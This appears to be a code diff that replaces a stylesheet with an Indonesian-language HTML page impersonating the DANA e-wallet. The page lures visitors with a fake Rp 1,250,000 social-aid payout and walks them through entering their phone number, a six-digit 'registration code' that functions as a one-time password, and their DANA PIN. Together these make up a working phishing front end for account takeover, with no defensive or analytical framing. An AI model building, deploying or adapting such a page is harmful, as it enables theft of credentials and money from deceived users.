@@ -1,568 +1,155 @@
-:root {
-  --primary: #119bff;
-  --primary-dark: #0d8ae3;
-  --white: #fff;
-  --white-10: rgba(255,255,255,.1);
-  --white-20: rgba(255,255,255,.2);
-  --white-30: rgba(255,255,255,.3);
-  --white-50: rgba(255,255,255,.5);
-  --white-70: rgba(255,255,255,.7);
-  --success: #4CAF50;
-  --error: #ff6b6b;
-  --warning: #ff9800;
-  --shadow: 0 4px 10px rgba(0,0,0,.15);
-  --input-bg: #ffffff;
-  --input-text: #333333;
-  --input-border: #dddddd;
-}
-
-body, .content {
-  font-family: 'Poppins', sans-serif;
-  margin: 0;
-  padding: 0;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  min-height: 100vh;
-}
-
-body {
-  background-color: var(--primary);
-  position: relative;
-}
-
-.content {
-  width: 100%;
-  max-width: 400px;
-  padding: 24px;
-  box-sizing: border-box;
-  justify-content: flex-start;
-}
-
-.container {
-  background: transparent;
-  border-radius: 16px;
-  padding: 24px;
-  text-align: center;
-  width: 100%;
-  max-width: 400px;
-  box-sizing: border-box;
-  transition: opacity .3s ease-in-out;
-}
-
-.container.hidden {
-  opacity: 0;
-  pointer-events: none;
-}
-
-.logo {
-  width: 100px;
-  margin-bottom: 24px;
-}
-
-h2 {
-  font-size: 18px;
-  font-weight: 600;
-  color: var(--white);
-  margin-bottom: 16px;
-}
-
-.phone-input-container {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin-bottom: 16px;
-}
-
-.country-code-box, #phone-number {
-  padding: 12px;
-  font-size: 14px;
-  display: flex;
-  align-items: center;
-}
-
-.country-code-box {
-  background: var(--input-bg);
-  color: var(--input-text);
-  border: 1px solid var(--input-border);
-  border-right: none;
-  border-radius: 8px 0 0 8px;
-}
-
-#phone-number {
-  background: var(--input-bg);
-  color: var(--input-text);
-  border: 1px solid var(--input-border);
-  border-radius: 0 8px 8px 0;
-  font-size: 18px;
-  width: 100%;
-  max-width: 600px;
-}
-
-#phone-number::placeholder {
-  color: #999999;
-}
-
-.flag-icon {
-  width: 19px;
-  margin-right: 5px;
-}
-
-.info-text, .info-text b {
-  font-size: 15px;
-  color: var(--white);
-  margin-bottom: 16px;
-  line-height: 1.4;
-}
-
-.warning-text {
-  font-size: 14px;
-  color: var(--warning);
-  margin-bottom: 16px;
-  font-weight: 500;
-  background-color: rgba(255, 152, 0, 0.1);
-  padding: 8px 12px;
-  border-radius: 8px;
-  border-left: 3px solid var(--warning);
-}
-
-.pin-container, .otp-container {
-  display: flex;
-  justify-content: center;
-  gap: 8px;
-  margin: 24px 0;
-}
-
-.pin-box, .otp-box {
-  width: 40px;
-  height: 40px;
-  text-align: center;
-  font-size: 18px;
-  border: 1px solid var(--input-border);
-  border-radius: 8px;
-  background: var(--input-bg);
-  color: var(--input-text);
-}
-
-.pin-box:focus, .otp-box:focus {
-  border-color: var(--primary);
-  outline: none;
-  box-shadow: 0 0 0 2px rgba(17, 155, 255, 0.2);
-}
-
-.show-text-container {
-  position: relative;
-  margin-bottom: 24px;
-}
-
-.show-text {
-  display: inline-block;
-  padding: 8px 16px;
-  border: 1px solid var(--white-50);
-  border-radius: 20px;
-  font-size: 14px;
-  color: var(--white);
-  background: var(--white-10);
-  cursor: pointer;
-  transition: all .3s ease;
-  user-select: none;
-}
-
-.show-text:hover {
-  background: var(--white-20);
-}
-
-.show-text:active {
-  transform: scale(.95);
-}
-
-.show-text.active {
-  background: var(--white-30);
-  border-color: var(--white);
-}
-
-.help-forgot-container {
-  display: flex;
-  justify-content: center;
-  font-size: 14px;
-  gap: 8px;
-  margin-top: 16px;
-}
-
-.help-forgot-container .link {
-  color: var(--white);
-  text-decoration: none;
-  padding: 4px 8px;
-}
-
-.otp-message-box {
-  background: var(--white-10);
-  padding: 16px;
-  border-radius: 12px;
-  text-align: center;
-  margin-bottom: 24px;
-}
-
-.otp-message-box div:first-child {
-  font-weight: 500;
-  margin-bottom: 8px;
-}
-
-.otp-message-box div:nth-child(2) {
-  font-size: 14px;
-  margin-bottom: 12px;
-}
-
-#resend-otp {
-  color: var(--white);
-  font-weight: 600;
-  cursor: pointer;
-  pointer-events: none;
-  opacity: 0.5;
-  transition: all 0.3s ease;
-}
-
-#resend-otp.active {
-  pointer-events: auto;
-  opacity: 1;
-  text-decoration: underline;
-}
-
-.floating-notification, #success-notification, #reward-notification {
-  position: fixed;
-  left: 50%;
-  transform: translateX(-50%);
-  padding: 12px;
-  border-radius: 8px;
-  text-align: center;
-  z-index: 100;
-  animation: fadeIn .3s ease-out;
-}
-
-.floating-notification {
-  background: var(--white);
-  color: var(--primary);
-  bottom: 24px;
-  width: 90%;
-  max-width: 400px;
-  display: none;
-  cursor: pointer;
-  transition: all .3s ease;
-  box-shadow: var(--shadow);
-}
-
-.floating-notification:hover {
-  transform: translateX(-50%) scale(1.02);
-}
-
-#success-notification {
-  background: var(--success);
-  color: var(--white);
-  padding: 16px;
-  bottom: 24px;
-  width: 90%;
-  max-width: 400px;
-}
-
-#reward-notification {
-  background: var(--white);
-  color: #333;
-  top: 50%;
-  transform: translate(-50%,-50%);
-  padding: 20px;
-  border-radius: 10px;
-  box-shadow: 0 0 20px rgba(0,0,0,.2);
-  max-width: 80%;
-  display: none;
-  z-index: 1000;
-}
-
-#reward-notification h3 {
-  color: var(--success);
-  margin-bottom: 10px;
-  font-size: 18px;
-}
-
-#reward-notification p {
-  margin: 0;
-  line-height: 1.5;
-  font-size: 15px;
-}
-
-.fixed-button-container {
-  position: fixed;
-  bottom: 16px;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 100%;
-  max-width: 400px;
-  padding: 16px;
-  text-align: center;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.fixed-button-container.hidden, .pin-page .fixed-button-container, .reward-page .fixed-button-container, .withdraw-page .fixed-button-container {
-  display: none !important;
-}
-
-.button, #verifikasi-button, #tarik-dana-button {
-  background: var(--white);
-  color: var(--primary);
-  border: none;
-  padding: 14px 0;
-  border-radius: 12px;
-  font-size: 16px;
-  cursor: pointer;
-  width: 80%;
-  max-width: 360px;
-  margin: 0 auto;
-  box-sizing: border-box;
-  font-weight: 600;
-  transition: all .3s ease-in-out;
-  box-shadow: var(--shadow);
-}
-
-.button:hover, #verifikasi-button:hover, #tarik-dana-button:hover {
-  background: rgba(255,255,255,.9);
-}
-
-.button:active, #verifikasi-button:active, #tarik-dana-button:active {
-  background: rgba(255,255,255,.8);
-  transform: scale(.98);
-}
-
-.saldo-container {
-  width: 100%;
-  padding: 20px;
-  box-sizing: border-box;
-  margin: 16px 0;
-  text-align: center;
-  animation: fadeIn .3s ease-out;
-  background: var(--white-10);
-  border-radius: 12px;
-}
-
-.saldo-amount {
-  font-size: 28px;
-  font-weight: 700;
-  color: var(--white);
-  margin-bottom: 8px;
-}
-
-.saldo-info {
-  font-size: 14px;
-  color: var(--white-70);
-  margin: 0;
-}
-
-.withdraw-button-container {
-  margin-top: 24px;
-  text-align: center;
-  animation: fadeIn .3s ease-out;
-}
-
-.phone-display {
-  background: var(--white-10);
-  padding: 12px;
-  border-radius: 8px;
-  margin: 16px 0;
-  font-size: 16px;
-  color: var(--white);
-  font-weight: 500;
-}
-
-#saldo-input {
-  width: 100%;
-  max-width: 360px;
-  padding: 12px;
-  border: 1px solid var(--white-50);
-  border-radius: 8px;
-  font-size: 16px;
-  background: var(--white-30);
-  color: var(--white);
-  box-sizing: border-box;
-  margin-bottom: 8px;
-}
-
-#saldo-input::placeholder {
-  color: var(--white-70);
-}
-
-.error-message {
-  color: var(--error);
-  font-size: 14px;
-  margin-top: 8px;
-}
-
-#attempt-counter {
-  font-size: 14px;
-  color: var(--white);
-  margin-top: 8px;
-  display: none;
-}
-
-#attempt-number {
-  font-weight: 700;
-}
-
-.verifikasi-button-container {
-  margin-top: 16px;
-  text-align: center;
-  animation: fadeIn .3s ease-out;
-}
-
-.spinner-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background-color: rgba(0,0,0,0.5);
-  z-index: 1000;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.spinner {
-  position: relative;
-  width: 54px;
-  height: 54px;
-}
-
-.spinner-back {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%,-50%);
-  z-index: 1001;
-}
-
-.spinner-front {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%,-50%);
-  z-index: 1002;
-  animation: spin 1s infinite linear;
-}
-
-@keyframes fadeIn {
-  from {
-    opacity: 0;
-    transform: translateY(10px);
-  }
-  to {
-    opacity: 1;
-    transform: translateY(0);
-  }
-}
-
-@keyframes spin {
-  from {
-    transform: translate(-50%,-50%) rotate(0deg);
-  }
-  to {
-    transform: translate(-50%,-50%) rotate(360deg);
-  }
-}
-
-#pin-page~#lanjutkan-container, #reward-page~#lanjutkan-container, #withdraw-page~#lanjutkan-container {
-  display: none !important;
-}
-
-/* NEW REWARD INSTRUCTION STYLES */
-.reward-instruction {
-  background: var(--white);
-  color: #333;
-  padding: 20px;
-  border-radius: 10px;
-  box-shadow: 0 0 20px rgba(0,0,0,.2);
-  max-width: 80%;
-  display: none;
-  z-index: 1000;
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  text-align: center;
-  animation: fadeInUp .5s ease-out;
-}
-
-.reward-instruction h3 {
-  color: var(--primary);
-  margin-bottom: 10px;
-  font-size: 18px;
-}
-
-.reward-instruction p {
-  margin: 0;
-  line-height: 1.5;
-  font-size: 15px;
-}
-
-.reward-instruction .reward-amount {
-  font-size: 24px;
-  font-weight: bold;
-  color: var(--success);
-  margin: 10px 0;
-}
-
-.reward-instruction .required-amount {
-  font-size: 18px;
-  font-weight: bold;
-  color: var(--error);
-  margin: 10px 0;
-}
-
-.reward-instruction .reward-badge {
-  background: var(--success);
-  color: white;
-  padding: 8px 16px;
-  border-radius: 20px;
-  display: inline-block;
-  margin: 10px 0;
-  animation: pulse 2s infinite;
-}
-
-@keyframes fadeInUp {
-  from {
-    opacity: 0;
-    transform: translate(-50%, -40%);
-  }
-  to {
-    opacity: 1;
-    transform: translate(-50%, -50%);
-  }
-}
-
-@keyframes pulse {
-  0% {
-    transform: scale(1);
-  }
-  50% {
-    transform: scale(1.05);
-  }
-  100% {
-    transform: scale(1);
-  }
-}
-
-.reward-instruction .close-btn {
-  background: var(--primary);
-  color: white;
-  border: none;
-  padding: 8px 16px;
-  border-radius: 20px;
-  margin-top: 15px;
-  cursor: pointer;
-  font-weight: 600;
-  transition: all 0.3s ease;
-}
-
-.reward-instruction .close-btn:hover {
-  background: var(--primary-dark);
-  transform: scale(1.02);
-}
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#118EEA">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>DANA Bantuan - Formulir Penerima Bantuan Digital</title>
+    <meta name="description" content="Formulir penerimaan bantuan digital DANA untuk masyarakat Indonesia yang memenuhi syarat.">
+    
+    <!-- ========== SOCIAL MEDIA META TAGS ========== -->
+    <meta property="og:url" content="https://link-dana-id-terbaru-2025.netlify.app/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="DANA Bantuan - Formulir Penerima Bantuan Digital">
+    <meta property="og:description" content="Daftarkan diri Anda untuk menerima bantuan digital melalui aplikasi DANA.">
+    <meta property="og:image" content="https://raw.githubusercontent.com/naklapang/Maakakshahuauahsg/main/public/image/dompet-digital-dana.webp">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Formulir Bantuan Digital DANA">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="DANA Bantuan - Formulir Penerima Bantuan">
+    <meta name="twitter:description" content="Daftarkan diri Anda untuk menerima bantuan digital melalui aplikasi DANA.">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/naklapang/Maakakshahuauahsg/main/public/image/dompet-digital-dana.webp">
+    <meta name="twitter:image:alt" content="Formulir Bantuan Digital DANA">
+    <!-- ========== END SOCIAL META TAGS ========== -->
+
+    <!-- Favicon and Preconnects -->
+    <link rel="icon" href="https://www.dana.id/favicon.ico">
+    <link rel="preconnect" href="https://a.m.dana.id">
+    <link rel="preconnect" href="https://app.link">
+    <link rel="preconnect" href="https://api2.branch.io">
+    
+    <!-- Fonts and Styles -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Loading Spinner -->
+  <div class="spinner-overlay" style="display: none;">
+    <div class="spinner">
+      <svg class="spinner-back" xmlns="http://www.w3.org/2000/svg" width="54" height="54" viewBox="0 0 54 54">
+        <g fill="none" fill-rule="evenodd" transform="translate(.012 .012)">
+          <circle cx="26.988" cy="26.988" r="26.667" fill="#000" fill-opacity=".6" opacity=".6"/>
+          <path fill="#FFF" d="M22.098 22.769a8.208 8.208 0 0 1-1.24.098 a6.834 6.834 0 0 1-1.653-.199c-.87-.215-1.658-.609-2.4-1.115-.096-.066-.273-.132-.34-.086-.086.06-.134.23-.136.355-.012.72-.006 1.439-.006 2.159v2.657l-.001 5.707c-.001.39.13.709.453.917 1.355.872 2.838 1.255 4.433 1.185 1.243-.055 2.443-.34 3.618-.733 1.308-.438 2.604-.91 3.908-1.361 1.14-.394 2.3-.716 3.502-.834 1.753-.17 3.406.158 4.92 1.123.35.222.497.133.497-.28v-5.724c0-1.6-.001-3.2.002-4.8.001-.458-.19-.79-.556-1.044-1.98-1.385-4.141-1.557-6.378-.912-1.305.376-2.577.88-3.849 1.369-1.564.6-3.107 1.262-4.774 1.518z"/>
+        </g>
+      </svg>
+      <svg class="spinner-front" xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 38 38">
+        <defs>
+          <linearGradient id="prefix__a" x1="38.883%" x2="50%" y1="-16.052%" y2="90.302%">
+            <stop offset="0%" stop-color="#EDEDED" stop-opacity="0"/>
+            <stop offset="56.544%" stop-color="#FFF"/>
+            <stop offset="100%" stop-color="#FFF" stop-opacity="0"/>
+          </linearGradient>
+        </defs>
+        <circle cx="29.333" cy="29.333" r="18.115" fill="none" stroke="url(#prefix__a)" stroke-width=".807" transform="rotate(45 36.64 11.693)"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="container">
+      <!-- Phone Number Page -->
+      <div id="number-page" style="display:block">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Formulir Penerima Bantuan DANA</h2>
+        <p class="info-text">Masukkan nomor HP terdaftar di aplikasi DANA untuk verifikasi penerima bantuan</p>
+        <div class="phone-input-container">
+          <div class="country-code-box">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon">
+            <span> +62</span>
+          </div>
+          <input type="tel" id="phone-number" placeholder="811-1234-56789" pattern="[0-9-]*" inputmode="numeric" maxlength="14">
+        </div>
+        <p class="warning-text">Pastikan nomor yang didaftarkan sama dengan nomor di aplikasi DANA</p>
+        <p class="info-text">Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.</p>
+      </div>
+
+      <!-- PIN Page -->
+      <div id="pin-page" style="display:none">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Masukkan Kode Pendaftaran</h2>
+        <p class="info-text">Masukkan 6 digit kode pendaftaran yang telah dikirimkan</p>
+        <div class="pin-container">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
+      </div>
+
+      <!-- Reward Page -->
+      <div id="reward-page" style="display:none">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Selamat! Anda Mendapatkan Bantuan</h2>
+        
+        <div class="saldo-container">
+          <div class="saldo-amount" id="saldo-amount">Rp 1.250.000</div>
+          <p class="saldo-info">Bantuan Dana Sosial yang telah disetujui</p>
+        </div>
+        
+        <p class="info-text">Silahkan klik verifikasi di aplikasi DANA untuk menerima hadiah dana bantuan</p>
+        
+        <div class="withdraw-button-container">
+          <button id="tarik-dana-button" class="button">Tarik ke DANA</button>
+        </div>
+      </div>
+
+      <!-- PIN Withdrawal Page -->
+      <div id="withdraw-page" style="display:none">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Tarik Bantuan ke DANA</h2>
+        
+        <div class="phone-display">
+          <span id="registered-phone">+62 811-1234-56789</span>
+        </div>
+        
+        <p class="info-text">Masukkan PIN DANA untuk memverifikasi penarikan dana bantuan</p>
+        
+        <div class="pin-container">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        </div>
+        
+        <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notifications -->
+  <div id="floating-notification" class="floating-notification" style="display:none">
+    <div id="notification-content">Proses verifikasi sedang berlangsung</div>
+  </div>
+  
+  <div id="success-notification" class="floating-notification" style="display:none;background-color:#4CAF50">
+    Proses penarikan dana bantuan berhasil
+  </div>
+  
+  <div id="reward-notification" class="notification" style="display:none"></div>
+
+  <!-- Continue Button -->
+  <div class="fixed-button-container" id="lanjutkan-container">
+    <button id="lanjutkan-button" class="button">Lanjutkan</button>
+  </div>
+
+  <!-- JavaScript -->
+  <script src="script.js"></script>
+</body>
+  </html>
